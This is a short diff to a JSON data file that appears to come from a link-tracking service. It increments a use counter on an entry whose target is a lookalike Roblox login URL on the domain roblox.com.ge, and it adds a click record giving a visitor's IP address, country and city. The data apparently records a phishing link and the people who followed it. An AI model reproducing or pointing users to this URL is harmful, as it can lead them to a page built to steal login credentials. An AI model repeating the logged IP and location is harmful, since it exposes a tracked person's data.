@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1234,
+    "useCount": 1235,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10016,6 +10016,14 @@
         "city": "Puteaux",
         "flag": "🇫🇷",
         "countryCode": "FR"
+      },
+      {
+        "timestamp": 1777331660013,
+        "ip": "181.67.205.209",
+        "country": "Peru",
+        "city": "Chiclayo",
+        "flag": "🇵🇪",
+        "countryCode": "PE"
       }
     ]
   },
